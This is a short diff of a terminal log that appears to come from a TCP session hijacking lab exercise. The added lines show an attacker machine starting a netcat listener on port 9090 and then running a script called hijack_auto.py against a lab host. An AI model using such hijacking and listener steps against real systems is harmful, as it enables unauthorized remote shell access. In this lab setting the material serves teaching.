@@ -18,6 +18,9 @@ To restore this content, you can run the 'unminimize' command.
 Last login: Sun Feb 13 08:07:01 UTC 2022 from user1-10.9.0.6.net-10.9.0.0 on pts/2
 seed@58a9ed39547c:~$ 
 
+root@Attacker-vm:/# nc -l 9090 &
+[1] 20
+
 root@Attacker-vm:/volumes/Task 5# ./hijack_auto.py
 
 seed@58a9ed39547c:~$ ls
